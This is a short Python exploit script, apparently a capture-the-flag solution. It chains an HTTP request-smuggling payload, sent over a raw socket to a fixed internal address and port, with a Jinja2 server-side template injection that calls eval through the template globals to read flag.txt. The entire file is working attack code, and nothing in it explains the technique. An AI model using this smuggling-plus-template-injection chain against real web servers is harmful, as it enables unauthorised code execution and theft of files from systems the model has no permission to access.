import socket
import urllib.parse

string = '''{{request.application.__globals__.__builtins__.eval("open('flag.txt', 'r').read()")}}'''
if len(string) > 100:
    print(len(string))
    raise RuntimeError
string = urllib.parse.quote_plus(string)
path = '/flag?name=' + string

payload = f"GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: {63 + len(path)}\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET {path} " \
          "HTTP/1.1\r\nHost: localhost\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
with socket.socket() as sock:
    sock.connect(('192.168.12.11', 8001))
    sock.send(payload.encode())
    while d := sock.recv(102400):
        print(d.decode())
